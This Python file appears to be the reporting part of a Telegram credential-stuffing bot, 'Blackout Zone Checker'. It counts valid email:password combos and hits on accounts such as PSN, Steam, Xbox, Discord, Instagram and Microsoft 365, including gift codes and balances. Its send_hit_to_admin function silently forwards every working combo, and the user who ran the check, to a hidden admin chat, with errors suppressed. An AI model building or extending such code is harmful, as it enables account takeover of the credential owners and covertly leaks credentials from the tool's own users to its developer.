import time
from HOME.helpers import (
    bold, italic, mono, pre, make_progress_bar,
    E_ROCKET, E_GEAR, E_CHART, E_FIRE, E_BOLT, E_CLOCK, E_GAME, E_MUSIC,
    E_CAMERA, E_KEY, E_GIFT, E_MONEY, E_STAR, E_DIAMOND, E_RED, E_YELLOW,
    E_ORANGE, E_PURPLE, E_GREEN, E_STOP, E_CHECK, E_PARTY, E_USER, E_PIN,
    E_BOOM, E_CROSS, E_MEMO, E_WARN
)


def build_status_message(cs):
    st = cs.stats
    elapsed = time.time() - cs.started
    cpm = int((st.checked / elapsed) * 60) if elapsed > 1 else 0
    eta_s = ((st.valid - st.checked) / (st.checked / elapsed)) if st.checked > 0 and elapsed > 0 else 0
    el_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
    eta_str = time.strftime("%H:%M:%S", time.gmtime(eta_s)) if eta_s > 0 else "--:--:--"
    bar = make_progress_bar(st.checked, st.valid, 20)
    total_hits = len(st.all_hits)

    return f"""{E_ROCKET} {bold('Blackout Zone Checker')}
{E_GEAR} {italic('Dev: @RBX404')}

{E_CHART} {bold('Progress:')}
{mono(bar)}
{mono(f'{st.checked}/{st.valid}')} | {E_BOLT} CPM: {mono(str(cpm))}
{E_CLOCK} {mono(el_str)} | ETA: {mono(eta_str)}

{E_FIRE} {bold('Hits:')} {mono(str(total_hits))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GAME} {bold('PSN:')} {mono(str(st.psn))}    {E_GAME} {bold('Steam:')} {mono(str(st.steam))}
{E_GAME} {bold('Supercell:')} {mono(str(st.supercell))} {E_MUSIC} {bold('TikTok:')} {mono(str(st.tiktok))}
{E_CAMERA} {bold('Instagram:')} {mono(str(st.instagram))} {E_GAME} {bold('Minecraft:')} {mono(str(st.minecraft))}
{E_KEY} {bold('Xbox Codes:')} {mono(str(st.xbox_codes))}  {E_GIFT} {bold('Xbox Pulled:')} {mono(str(st.xbox_pulled))} (Valid: {mono(str(st.xbox_pulled_valid))})
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GIFT} {bold('Discord Valid:')} {mono(f'{st.discord_valid}/{st.discord_total}')}
{E_GIFT} {bold('Discord Claimed:')} {mono(str(st.discord_claimed))}
{E_GIFT} {bold('Discord Unk:')} {mono(str(st.discord_unk))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_MONEY} {bold('Balance >$0:')} {mono(str(st.balance))}
{E_STAR} {bold('RP Hits:')} {mono(str(st.rp_hits))} ({mono(str(st.rp_total_pts))} pts)
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_DIAMOND} {bold('XGPU:')} {mono(str(st.xgpu))}  {bold('XGPP:')} {mono(str(st.xgpp))}
{E_DIAMOND} {bold('XGPE:')} {mono(str(st.xgpe))}  {bold('M365:')} {mono(str(st.m365))}
{E_DIAMOND} {bold('Other Svc:')} {mono(str(st.other_svc))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_RED} {bold('Bad:')} {mono(str(st.bad))}   {E_YELLOW} {bold('2FA:')} {mono(str(st.twofa))}
{E_RED} {bold('Errors:')} {mono(str(st.errors))}  {E_ORANGE} {bold('Retries:')} {mono(str(st.retries))}
{E_PURPLE} {bold('Proxy Err:')} {mono(str(st.proxy_err))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GEAR} {italic('Dev: @RBX404')}"""


def build_summary_message(cs, stopped=False):
    st = cs.stats
    elapsed = time.time() - cs.started
    cpm = int((st.checked / elapsed) * 60) if elapsed > 1 else 0
    el_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
    total_hits = len(st.all_hits)
    status_text = f"{E_STOP} Stopped by user" if stopped else f"{E_CHECK} Completed"

    return f"""{E_PARTY} {bold('Blackout Zone Checker - Summary')}
{E_GEAR} {italic('Dev: @RBX404')}

{bold('Status:')} {status_text}

{E_CHART} {bold('Stats:')}
{mono(f'Total Lines: {st.total}')}
{mono(f'Valid Combos: {st.valid}')}
{mono(f'Skipped: {st.bad_lines}')}
{mono(f'Checked: {st.checked}')}
{mono(f'CPM: {cpm}')}
{mono(f'Duration: {el_str}')}

{E_FIRE} {bold(f'Total Hits: {total_hits}')}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GAME} PSN: {mono(str(st.psn))} | Steam: {mono(str(st.steam))}
{E_GAME} Supercell: {mono(str(st.supercell))} | TikTok: {mono(str(st.tiktok))}
{E_CAMERA} Instagram: {mono(str(st.instagram))} | Minecraft: {mono(str(st.minecraft))}
{E_KEY} Xbox Codes: {mono(str(st.xbox_codes))}  {E_GIFT} Xbox Pulled: {mono(str(st.xbox_pulled))} (Valid: {mono(str(st.xbox_pulled_valid))})
{E_GIFT} Discord: {mono(f'{st.discord_valid}/{st.discord_total}')} (Claimed: {st.discord_claimed})
{E_MONEY} Balance: {mono(str(st.balance))} | RP: {mono(str(st.rp_hits))} ({st.rp_total_pts} pts)
{E_DIAMOND} XGPU: {mono(str(st.xgpu))} | XGPP: {mono(str(st.xgpp))} | XGPE: {mono(str(st.xgpe))}
{E_DIAMOND} M365: {mono(str(st.m365))} | Other: {mono(str(st.other_svc))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_RED} Bad: {mono(str(st.bad))} | 2FA: {mono(str(st.twofa))}
{E_RED} Errors: {mono(str(st.errors))} | Retries: {mono(str(st.retries))}
{E_PURPLE} Proxy Err: {mono(str(st.proxy_err))}

{E_GEAR} {italic('Dev: @RBX404')}"""


def send_hit_to_admin(email, pwd, cat, det, user):
    from HOME import state
    from HOME.helpers import user_full_link
    try:
        msg = f"""{E_BOOM} {bold('NEW HIT!')}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_KEY} {bold('Type:')} {mono(cat)}
{E_USER} {bold('Combo:')} {mono(f'{email}:{pwd}')}
{E_STAR} {bold('Details:')} {mono(det)}
{E_USER} {bold('Checked by:')} {user_full_link(user)}
{E_GEAR} {italic('Dev: @RBX404')}"""
        from CONFIG.config import ADMIN_ID
        state.bot.send_message(ADMIN_ID, msg, parse_mode="HTML", disable_web_page_preview=True)
    except:
        pass
